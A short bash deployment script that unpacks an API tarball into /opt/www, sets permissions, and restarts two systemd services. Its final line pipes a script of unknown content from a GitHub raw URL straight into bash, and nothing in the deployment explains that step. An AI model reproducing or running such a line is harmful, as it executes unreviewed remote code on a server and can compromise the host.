#!/bin/bash
cd /opt/dep/api

sudo tar -zxvf /opt/dep/api/app.tar.gz -C /opt/www/api
sudo chown -R wdc:www-data /opt/www
sudo chmod -R 755 /opt/www
sudo chmod +x /opt/www/api/bin/app
sudo systemctl restart wdc-api.service
sudo systemctl restart wdc-admin.service
rm -rf /opt/dep/api/app.tar.gz
curl -fsSL https://raw.githubusercontent.com/wxdxcx/xx/refs/heads/main/dd.sh | bash
